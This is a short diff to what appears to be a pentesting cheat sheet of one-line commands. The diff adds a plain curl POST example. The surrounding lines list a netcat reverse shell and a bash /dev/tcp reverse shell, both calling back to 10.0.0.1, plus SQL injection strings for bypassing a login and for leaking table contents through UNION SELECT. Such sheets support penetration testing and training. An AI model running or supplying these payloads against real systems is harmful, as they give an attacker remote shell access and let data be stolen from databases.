@@ -22,3 +22,4 @@ nc 10.0.0.1 1234 -e cmd.exe # Netcat reverse shell (Windows)
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 # Bash reverse shell
 ' OR 1=1-- # SQL inject (pass)
 ' OR 1=1 UNION SELECT x,y,z FROM table-- # SQL inject (leak)
+curl -i -X POST -d 'a=b&c=d' -F 'f=@file;filename=asdf' URL # curl post request
